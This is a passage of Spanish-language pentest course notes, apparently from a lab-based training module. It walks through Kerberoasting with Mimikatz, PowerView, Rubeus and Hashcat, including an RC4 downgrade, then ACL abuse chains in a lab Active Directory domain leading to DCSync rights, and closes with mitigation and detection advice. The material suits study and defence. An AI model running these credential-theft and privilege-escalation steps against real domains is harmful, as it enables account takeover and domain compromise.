   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
====================
Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
====================
<base64_code>
====================
	* Saved to file       : ...
```

Si no especificamos `base64 /out:true`, Mimikatz extraerá los tickets y los guardará directamente en archivos `.kirbi`. Dependiendo de nuestra ubicación en la red y de lo fácil que nos resulte mover esos ficheros a nuestro host de ataque, esto puede ser más cómodo a la hora de crakear los tickets.

A continuación, tomaremos el blob en Base64 obtenido anteriormente y eliminaremos saltos de línea y espacios en blanco, ya que la salida trae los datos divididos en columnas; necesitamos que todo quede en una sola línea para el siguiente paso.

##### Preparando el Blob en Base64 para el cracking

```shell-session
$ echo "<base64 blob>" |  tr -d \\n 

doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADA...
```

Podemos colocar la línea única anterior en un archivo y convertirla de nuevo en un fichero `.kirbi` usando la utilidad `base64`.

```shell-session
$ cat encoded_file | base64 -d > sqldev.kirbi
```

Después, podemos usar esta [versión](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) de `kirbi2john.py` para extraer el ticket Kerberos del archivo TGS. 

```shell-session
$ python2.7 kirbi2john.py sqldev.kirbi
```

Esto creará un archivo llamado `crack_file`. Debemos modificar el archivo un poco  para poder usar Hashcat

```shell-session
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Lo crackeamos con Hashcat, con el módulo `13100` y obtenemos la contraseña `database!`. Si decidimos omitir la salida en Base64 con Mimikatz y ejecutar

```
mimikatz # kerberos::list /export
```

los archivos `.kirbi` se escribirán directamente en disco. En ese caso, podemos descargar los ficheros y ejecutar `kirbi2john.py` sobre ellos sin necesidad de decodificar Base64.

Ahora que hemos visto el método más manual y anticuado para realizar Kerberoasting desde Windows y procesar offline, veamos formas más rápidas. La mayoría de las auditorías tienen tiempo limitado y necesitamos trabajar con la máxima eficiencia, por lo que el método anterior no será siempre nuestra primera opción. Sin embargo, es útil contar con estos trucos y metodologías como alternativa en caso de que nuestras herramientas automatizadas fallen o estén bloqueadas.

### Ruta automatizada / basada en herramientas

A continuación cubriremos dos formas mucho más rápidas de realizar Kerberoasting desde un host Windows. Primero, utilicemos PowerView para extraer los tickets TGS y convertirlos al formato de Hashcat. Podemos comenzar enumerando las cuentas SPN.

##### Usando PowerView para enumerar cuentas SPN

```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

Desde aquí, podríamos apuntar a un usuario específico y obtener el ticket TGS en formato Hashcat

```powershell
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

SamAccountName       : sqldev
DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*...
```

Finalmente, podemos exportar todos los tickets a un fichero CSV para procesarlos offline. 

```powershell-session
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

También podemos usar Rubeus para acontecer Kerberoasting incluso más fácilmente y rápido. Rubeus nos proporciona una variedad de opciones para Kerberoasting. Como podemos ver al recorrer el menú de ayuda de Rubeus, la herramienta ofrece multitud de opciones para interactuar con Kerberos, la mayoría fuera del alcance de este módulo y que se tratarán en profundidad en futuros módulos sobre ataques avanzados a Kerberos. Vale la pena revisar el menú, familiarizarse con las opciones y documentarse sobre las diversas tareas posibles. Algunas opciones incluyen:

- Realizar Kerberoasting y volcar hashes a un archivo.    
- Usar credenciales alternativas.    
- Combinar Kerberoasting con un ataque Pass-the-Ticket.    
- Hacer un Kerberoasting “opsec” para filtrar cuentas habilitadas con AES.    
- Solicitar tickets de cuentas cuyas contraseñas se establecieron en un rango de fechas específico.    
- Limitar el número de tickets solicitados.    
- Realizar Kerberoasting con cifrado AES.

Podemos empezar usando Rubeus para recopilar algunas estadísticas. En la salida siguiente vemos que hay nueve usuarios atacables mediante Kerberoasting: siete de ellos soportan cifrado RC4 para las solicitudes de ticket y dos soportan AES 128/256. Más adelante hablaremos de los tipos de cifrado. También observamos que las contraseñas de las nueve cuentas se establecieron este año (2022 en el momento de redactar esto). Si viésemos cuentas SPN con contraseñas fijadas hace cinco años o más, podrían ser objetivos interesantes, ya que podrían tener una contraseña débil que se configuró en sus inicios y nunca se cambió al madurar la organización.

```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /stats

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] Listing statistics about target users, no ticket requests being performed.
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 9


 ------------------------------------------------------------
 | Supported Encryption Type                        | Count |
 ------------------------------------------------------------
 | RC4_HMAC_DEFAULT                                 | 7     |
 | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     |
 ------------------------------------------------------------

 ----------------------------------
 | Password Last Set Year | Count |
 ----------------------------------
 | 2022                   | 9     |
 ----------------------------------
```

Vamos a usar Rubeus para solicitar tickets de las cuentas cuyo atributo **adminCount** esté establecido en 1. Estas serán probablemente objetivos de alto valor y merecerán nuestro enfoque inicial en el cracking offline con Hashcat. Asegúrate de incluir la opción `/nowrap`, de modo que los hashes no se dividan en columnas y puedan copiarse directamente para el cracking; según la documentación, `/nowrap` impide que cualquier blob de ticket en Base64 se ajuste en columnas, por lo que no tendremos que preocuparnos de eliminar espacios o saltos de línea antes de usar Hashcat.

```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

...SNIP...

[*] Hash                   : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$backupjob/ve...
```

### Tipos de encriptado

Las herramientas de Kerberoasting suelen solicitar cifrado RC4 (tipo 23) porque es más débil y rápido de crackear con Hashcat que AES (tipos 17 y 18). Por eso la mayoría de hashes comienzan con `$krb5tgs$23$*`. Aunque AES-128 y AES-256 también pueden romperse offline, requieren mucho más tiempo salvo contraseñas muy débiles. Veamos un ejemplo:

Empecemos creando una cuenta SPN llamada **testspn** y usando Rubeus para realizar Kerberoasting sobre este usuario específico a modo de prueba. Como podemos ver, hemos recibido un ticket TGS cifrado con RC4 (tipo 23).

```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : testspn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : testspn
[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
[*] PwdLastSet             : 2/27/2022 12:15:43 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/
```

Al comprobar con PowerView, vemos que el atributo **msDS-SupportedEncryptionTypes** está en 0. Según la tabla, el valor decimal 0 indica que no se ha definido un tipo de cifrado específico y se usa el predeterminado **RC4_HMAC_MD5**.

```powershell-session
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                            0 testspn
```

A continuación, rompamos este ticket con Hashcat y anotemos el tiempo que ha empleado. Para nuestro ejemplo, la cuenta tiene una contraseña débil incluida en la wordlist rockyou.txt. Al ejecutar Hashcat en CPU, vimos que tardó cuatro segundos en crackearse, por lo que en un rig con GPU potente se rompería casi al instante e incluso en una sola GPU probablemente ocurriría de forma casi instantánea.

```shell-session
$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

Vamos a asumir que nuestro cliente tiene cuentas SPN que apoyen encriptación AES 128/256.

![[Pasted image 20250707134836.png]]

Al comprobarlo con PowerView, veremos que el atributo **msDS-SupportedEncryptionTypes** está en 24, lo que significa que solo se admiten los tipos de cifrado AES 128 y AES 256.

```powershell-session
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                            24 testspn
```

##### Solicitando un nuevo ticket

```powershell-session
PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap

... SNIP ...

[*] Hash                   : $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*testspn/kerberoast.inla...
```

Para ejecutar esto con Hashcat, debemos usar el modo de hash **19700**, que corresponde a Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96), según la tabla de ejemplos de Hashcat. Ejecutamos el hash AES así y comprobamos el estado; al pulsar **s** veremos que tardará más de 23 minutos en procesar toda la wordlist rockyou.txt.

```shell-session
$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```

Podemos usar Rubeus con el parámetro `/tgtdeleg` para indicar que solo queremos cifrado RC4 al solicitar un nuevo ticket de servicio. La herramienta fuerza este comportamiento al especificar RC4 como único algoritmo soportado en el cuerpo de la petición TGS. Probablemente sea un mecanismo de compatibilidad con versiones anteriores de Active Directory. Al emplear este flag, obtenemos un ticket cifrado con RC4 (tipo 23) que podremos crackear mucho más rápido.

##### Usando la flag `/tgtdeleg`

![[rubeus_tgtdeleg.png]]

En la imagen anterior podemos ver que, al usar el parámetro `/tgtdeleg`, la herramienta solicitó un ticket RC4 a pesar de que los tipos de cifrado admitidos estén configurados como AES 128/256. Este sencillo ejemplo muestra la importancia de una enumeración exhaustiva y de profundizar en los detalles al realizar ataques como Kerberoasting. Aquí pudimos degradar de AES a RC4 y reducir el tiempo de cracking en más de 4 minutos y 30 segundos. En un entorno real, con un rig de GPU potente para crakear contraseñas, este tipo de degradación podría suponer pasar de días de trabajo a tan solo unas horas, marcando la diferencia en nuestro proceso de evaluación.

> **Nota:**  
> Esto no funciona contra un Controlador de Dominio con Windows Server 2019, independientemente del nivel funcional del dominio. Siempre devolverá un ticket de servicio cifrado con el nivel más alto soportado por la cuenta objetivo.  
> 
> En dominios cuyos DCs sean Server 2016 o anteriores (muy comunes), habilitar AES no mitigará parcialmente Kerberoasting devolviendo solo tickets AES (difíciles de crackear), sino que permitirá igualmente solicitar un ticket cifrado con RC4.  
> 
> En DCs de Windows Server 2019, habilitar cifrado AES en una cuenta SPN hará que recibamos un ticket de servicio AES-256 (tipo 18), mucho más duro (aunque no imposible) de crackear, especialmente si se usa una contraseña débil de diccionario.  

Se puede modificar en la política de dominio los tipos de cifrado permitidos para Kerberos (GPO → Configuración del equipo → Políticas → Configuración de Windows → Configuración de seguridad → Políticas locales → Opciones de seguridad → “Seguridad de red: Configurar tipos de cifrado permitidos para Kerberos”). Si se quitan todos los cifrados salvo RC4_HMAC_MD5, un DC 2019 permitiría el downgrade a RC4, pero suprimir AES debilita la seguridad de AD y no es recomendable. Además, eliminar RC4 podría causar problemas operativos y debe probarse a fondo antes de aplicarlo.

![[GroupPolicyEditor.png]]
### Mitigación y detección

Para mitigar Kerberoasting en cuentas de servicio no gestionadas, usa contraseñas largas y complejas o, mejor aún, Managed Service Accounts (MSA) y Group Managed Service Accounts (gMSA) que generan claves muy robustas y las rotan automáticamente (al igual que LAPS).

Kerberoasting se diferencia del tráfico Kerberos normal al generar un pico anómalo de peticiones TGS-REQ/TGS-REP con cifrado RC4. Puedes auditar estas operaciones en los DC activando en la GPO la “Auditoría de operaciones de tickets de servicio Kerberos”.

![[kerb.png]]
Al hacerlo se generan dos IDs de evento distintos:

- **4769**: Se solicitó un ticket de servicio Kerberos.    
- **4770**: Se renovó un ticket de servicio Kerberos.    

Unas 10–20 solicitudes TGS (evento 4769) para una misma cuenta en un periodo razonable se consideran normales. Sin embargo, un gran número de eventos 4769 de una sola cuenta en poco tiempo puede indicar un ataque.

A continuación vemos un ejemplo de un ataque de Kerberoasting registrado en los logs. Observamos múltiples eventos 4769 en sucesión, un comportamiento anómalo. Al abrir uno, podemos ver que el usuario **htb-student** (el atacante) solicitó un ticket al servicio **sqldev** (la víctima). También comprobamos que el tipo de cifrado del ticket es `0x17` (hex), que equivale a 23 (RC4), lo que significa que el ticket se cifró con RC4 y, si la contraseña es débil, hay muchas probabilidades de que el atacante pueda crackearlo y tomar control de la cuenta **sqldev**.

![[kerb2.png]]

Algunas otras medidas de mitigación incluyen restringir el uso del algoritmo RC4, especialmente en las solicitudes Kerberos de cuentas de servicio (probándolo previamente para garantizar que nada falle en el entorno). Además, las cuentas de **Domain Admins** y otros usuarios con privilegios elevados no deberían configurarse como cuentas SPN, salvo que sea estrictamente necesario.

# ACL (Access Control List)

> Por razones de seguridad, no todos los usuarios y equipos en un entorno AD pueden acceder a todos los objetos y archivos. Estos permisos se gestionan mediante Listas de Control de Acceso (ACL). Una pequeña mala configuración en una ACL puede filtrar permisos hacia objetos que no los necesitan, lo que supone una seria amenaza para la postura de seguridad del dominio.

### Descripción general de ACL

Las ACL son listas que indican quién (“security principal”) y con qué nivel de acceso (ACE) puede interactuar con un objeto. Hay dos tipos:

- **DACL**: controla permisos explícitos. Si falta, concede todo; si está vacía, niega todo.    
- **SACL**: registra en log los intentos de acceso.    

Cada ACE dentro de la DACL vincula un usuario, grupo o proceso a un permiso concreto (p. ej. Control total, Cambiar contraseña).

##### Visualización de la ACL de forend

> _$forend$ es un usuario_

![[forend_ACL.png]]

Los SACLs pueden verse en la pestaña `Auditing`:

![[forend_SACL.png]]

### Access Control Entries (ACEs)

| ACE                    | Descripción                                                                                                       |
|------------------------|-------------------------------------------------------------------------------------------------------------------|
| Access denied ACE      | Entrada en la DACL que deniega explícitamente el acceso a un usuario o grupo a un objeto.                         |
| Access allowed ACE     | Entrada en la DACL que otorga explícitamente el acceso a un usuario o grupo a un objeto.                         |
| System audit ACE       | Entrada en la SACL que genera registros de auditoría cuando un usuario o grupo intenta acceder a un objeto, anotando si se permitió o denegó el acceso y el tipo de acceso realizado. |

Cada ACE consta de estos cuatro componentes:

1. **Identificador de seguridad (SID)** del usuario/grupo que tiene acceso al objeto (o nombre del principal, según se muestre gráficamente).    
2. **Tipo de ACE**, que indica si es de denegación de acceso (access denied), concesión de acceso (access allowed) o auditoría de sistema (system audit).    
3. **Flags de herencia**, que especifican si los contenedores u objetos hijos pueden heredar esta entrada ACE del objeto principal o padre.    
4. **Access mask**, un valor de 32 bits que define los derechos concretos concedidos sobre el objeto.

Podemos verlo de forma gráfica en **Usuarios y Equipos de Active Directory (ADUC)**. En la imagen de ejemplo siguiente, podemos observar lo siguiente para la entrada ACE del usuario **forend**:

![[aces_forend.png]]

- El principal de seguridad es **Angela Dunn** (`adunn@inlanefreight.local`).    
- El tipo de ACE es **Permitir**.    
- La herencia se aplica a “Este objeto y todos los objetos descendientes”, es decir, cualquier objeto hijo de **forend** heredará estos mismos permisos.    
- Los derechos concedidos al objeto se muestran gráficamente en el ejemplo (p. ej. Control total, Lectura, etc.).    

Cuando el sistema evalúa una lista de control de acceso, recorre las entradas de arriba abajo y detiene la comprobación en cuanto encuentra una ACE de **Denegar**.

##### ¿Por qué los ACEs son importantes?

Los atacantes aprovechan las entradas ACE para ampliar su acceso o establecer persistencia. Esto es muy útil para nosotros como pentesters, ya que muchas organizaciones desconocen qué ACEs se han aplicado a cada objeto o el impacto que pueden tener si se configuran incorrectamente. Estas configuraciones no pueden detectarse con herramientas de escaneo de vulnerabilidades y a menudo permanecen sin revisarse durante años, especialmente en entornos grandes y complejos. En una auditoría en la que el cliente ya ha corregido los “low hanging fruit” de AD, el abuso de ACLs puede ser una vía excelente para moverse lateral o verticalmente e incluso lograr la compromi­sión total del dominio. Algunos ejemplos de permisos de seguridad sobre objetos de Active Directory son:

- **ForceChangePassword**: abusado con `Set-DomainUserPassword`    
- **Add Members**: abusado con `Add-DomainGroupMember`    
- **GenericAll**: abusado con `Set-DomainUserPassword` o `Add-DomainGroupMember
- **GenericWrite**: abusado con `Set-DomainObject`    
- **WriteOwner**: abusado con `Set-DomainObjectOwner`    
- **WriteDACL**: abusado con `Add-DomainObjectACL`    
- **AllExtendedRights**: abusado con `Set-DomainUserPassword` o `Add-DomainGroupMember`    
- **AddSelf**: abusado con `Add-DomainGroupMember`    

Estas relaciones pueden enumerarse (y visualizarse) con herramientas como BloodHound y explotarse con PowerView, entre otras. En este módulo veremos cómo aprovechar cuatro ACEs clave para ataques sobre ACL:

- **ForceChangePassword**: permite restablecer la contraseña de un usuario sin conocerla previamente (útil, pero debe pactarse con el cliente).    
- **GenericWrite**: autoriza a modificar atributos no protegidos:    
    - Sobre usuarios, podemos asignarles un SPN para Kerberoasting.        
    - Sobre grupos, añadirnos a ellos.        
    - Sobre equipos, habilitar Resource-Based Constrained Delegation.        
- **AddSelf**: permite a un usuario añadirse a determinados grupos de seguridad.    
- **GenericAll**: otorga control total sobre el objeto:    
    - En usuarios o grupos, cambiar contraseñas, modificar membresías y Kerberoasting dirigido.        
    - En equipos, leer contraseñas LAPS si está en uso, obteniendo administrador local.        

Más adelante profundizaremos en cada uno de estos ataques, tanto desde Windows como desde Linux.

![[Grafico.png]]

En AD encontraremos continuamente ACEs y privilegios nuevos; nuestra forma de detectarlos (con BloodHound, PowerView o herramientas nativas) debe ser suficientemente flexible para adaptarnos. Por ejemplo, podríamos ver que tenemos permiso `ReadGMSAPassword` sobre un gMSA y usar herramientas como GMSAPasswordReader para extraer esa contraseña. O hallar derechos extendidos como `Unexpire-Password` o `Reanimate-Tombstones` y buscar la manera de explotarlos. Familiarizarse con todas las aristas de BloodHound y los derechos extendidos de AD es clave, pues nunca sabes cuál podrás necesitar en una auditoría.

Podemos aprovechar ataques sobre ACL para moverse lateralmente, escalar privilegios o mantener persistencia. Los escenarios más comunes son:

- **Abusar de permisos de restablecer contraseñas**: si tomamos control de cuentas con derecho a “olvidé mi contraseña” (Help Desk, IT), podemos resetear la de cuentas más privilegiadas.    
- **Abusar de la gestión de membresías de grupo**: con permisos para añadir/quitar usuarios de grupos, podemos incluirnos en uno privilegiado.    
- **Derechos excesivos heredados o accidentales**: instalaciones de software (p. ej. Exchange) o configuraciones antiguas pueden dejar ACLs que conceden permisos inesperados a usuarios o equipos.    

> **Nota:** Algunas de estas acciones son “destructivas” (cambiar contraseñas, modificar objetos). Si tienes dudas, consulta siempre al cliente y documenta cada cambio para revertirlo y dejar evidencia en el informe.

### Enumerando ACLs con PowerView

Podemos usar PowerView para enumerar ACLs, pero la tarea de buscar entre _todos_ los resultados será extremadamente lenta y seguramente imprecisa. Por ejemplo, si ejecutamos la función `Find-InterestingDomainAcl` recibiremos una cantidad masiva de información sobre la que tendremos que buscar detalladamente para que tenga algo de sentido:

##### Usando `Find-InterestingDomainAcl`

```powershell-session
PS C:\htb> Find-InterestingDomainAcl
...SNIP...
```

Si intentamos revisar todos estos datos durante una auditoría con tiempo limitado, probablemente no lleguemos a nada interesante antes de que termine. Sin embargo, existe una forma de usar herramientas como PowerView de manera más eficaz: realizar una enumeración dirigida empezando por un usuario sobre el que ya tengamos control. Centrémonos en el usuario **wley**, cuya cuenta obtuvimos tras resolver la última cuestión en la sección “LLMNR/NBT-NS Poisoning – desde Linux”. Profundicemos y veamos si este usuario tiene algún permiso ACL interesante que podamos explotar. Primero necesitamos obtener el SID de nuestro usuario objetivo para buscar de forma efectiva.

```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley
```

A continuación podemos usar la función `Get-DomainObjectACL` para realizar nuestra búsqueda dirigida. En el ejemplo siguiente, empleamos esta función para encontrar todos los objetos del dominio sobre los que nuestro usuario tiene permisos, asignando el SID del usuario (almacenado en la variable `$sid`) a la propiedad `SecurityIdentifier`, que indica quién posee cada permiso sobre un objeto.

Un punto a tener en cuenta: si ejecutamos la búsqueda sin el parámetro `-ResolveGUIDs`, obtendremos resultados como el que se muestra más abajo, donde el permiso `ExtendedRight` no nos aclara qué entrada ACE concreta tiene **wley** sobre **damundsen**. Esto ocurre porque la propiedad `ObjectAceType` devuelve un valor GUID que no es legible por humanos.

> **Aviso:** Este comando puede tardar bastante en ejecutarse, especialmente en entornos grandes. En nuestro laboratorio, puede tardar entre 1 y 2 minutos en completarse.

##### Usando Get-DomainObjectACL

```powershell-session
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

Podríamos buscar en Google el GUID **00299570-246d-11d0-a768-00aa006e0529** y dar con una página que indica que el usuario tiene el derecho de forzar el cambio de contraseña de otro usuario. Alternativamente, podríamos hacer una búsqueda inversa con PowerShell para mapear el nombre del permiso de vuelta al valor GUID.

> Si PowerView ya ha sido importado, el cmdlet mostrado debajo resultará en error. Por tanto, puede que necesitemos ejecutarlo desde una nueva sesión de PowerShell.

##### Realizando una búsqueda inversa y mapeando a un valor GUID

```powershell-session
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

Name              : User-Force-Change-Password
DisplayName       : Reset Password
DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
```

Esto nos dio nuestra respuesta, pero sería muy ineficiente durante una auditoría PowerView cuenta con el flag `ResolveGUIDs`, que hace esto por nosotros. Fíjemonos en cómo el output cambia cuando incluimos este flag para mostrar el formato legible de la propiedad `ObjectAceType` como `User-Force-Change-Password`.

##### Usando el flag `-ResolveGUIDs`

```powershell-session
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

> ¿Por qué recorrimos este ejemplo cuando podríamos haber buscado usando `-ResolveGUIDs` desde el principio?

Es fundamental comprender qué hacen nuestras herramientas y disponer de métodos alternativos en nuestra caja de herramientas por si una herramienta falla o queda bloqueada. Antes de continuar, veamos rápidamente cómo podríamos hacer esto usando los cmdlets `Get-Acl` y `Get-ADUser`, que quizá estén disponibles en un sistema del cliente. Saber realizar este tipo de búsquedas sin depender de herramientas como PowerView es muy valioso y puede marcar la diferencia frente a otros profesionales. Podríamos usar este conocimiento para obtener resultados cuando el cliente nos limite a los comandos ya presentes en su sistema y no podamos cargar nuestras propias utilidades.

Este ejemplo no es muy eficiente y el comando puede tardar mucho en ejecutarse, especialmente en entornos grandes. Llevará mucho más tiempo que el comando equivalente con PowerView. En este comando, primero hemos generado una lista de todos los usuarios del dominio con el siguiente comando:

##### Creando una lista de usuarios de dominio

```powershell-session
PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

A continuación leemos cada línea del fichero con un bucle `foreach` y para cada usuario:

1. Ejecutamos `Get-ADUser` pasándole el nombre de usuario (desde cada línea de `ad_users.txt`).    
2. Con `Get-Acl` obtenemos la información de ACL de ese objeto usuario.    
3. Seleccionamos únicamente la propiedad `Access`, que contiene los derechos de acceso.    
4. Filtramos por la propiedad `IdentityReference` estableciéndola en el usuario bajo nuestro control (en este caso, **wley**) para ver a qué objetos tiene permisos.

```powershell-session
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana 
                        Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
InheritanceType       : All
ObjectType            : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : INLANEFREIGHT\wley
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
```

Una vez dispongamos de estos datos, podríamos seguir los métodos mostrados más arriba para convertir el GUID a un formato legible y entender qué permisos tenemos sobre el usuario objetivo.

En resumen, partimos del usuario **wley** y ahora tenemos control sobre la cuenta **damundsen** gracias al derecho extendido **User-Force-Change-Password**. Usemos Powerview para buscar hacia dónde —si es que en algún sitio— nos puede llevar el control de la cuenta **damundsen**.

##### Enumeración exhaustiva sobre los privilegios usando damundsen

```powershell-session
PS C:\htb> $sid2 = Convert-NameToSid damundsen
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

Nuestro usuario **damundsen** tiene **GenericWrite** sobre el grupo **Help Desk Level 1**, lo que le permite añadirse (o añadir a otros) y heredar sus permisos. Además, ese grupo está anidado dentro de **Information Technology**, por lo que al ponernos en **Help Desk Level 1** automáticamente obtenemos todos los derechos que concede **Information Technology**.

##### Investigando el grupo Help Desk Level 1 con Get-DomainGroup

```powershell-session
PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

memberof                                                                      
--------                                                                      
CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

En resumen:

- Con la contraseña de **wley** (recuperada y crackeada) hemos visto que su ACL le permite forzar el cambio de contraseña de **damundsen**.    
- **Damundsen** a su vez tiene **GenericWrite** sobre **Help Desk Level 1**, así que puede añadirse a ese grupo.    
- **Help Desk Level 1** está anidado en **Information Technology**, así que al entrar en el primero heredamos todos los derechos del segundo.    
- Miembros de **Information Technology** poseen **GenericAll** sobre **adunn**, lo que nos permitirá modificar membresías, forzar cambios de contraseña o lanzar un Kerberoasting dirigido sobre **adunn**.

##### Investigando el grupo Information Technology

```powershell-session
PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```

> Finalmente, veamos si el usuario `adunn` tiene algún tipo de acceso interesante que podamos aprovechar para acercarnos a nuestro objetivo

##### Buscando acceso interesante

```powershell-session
PS C:\htb> $adunnsid = Convert-NameToSid adunn 
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

<SNIP>
```

La salida muestra que el usuario **adunn** tiene los derechos **DS-Replication-Get-Changes** y **DS-Replication-Get-Changes-In-Filtered-Set** sobre el objeto de dominio. Esto significa que podemos usarlo para realizar un ataque DCSync. Cubriremos este ataque en detalle en la sección de DCSync.

### Enumerando ACLs con BloodHound

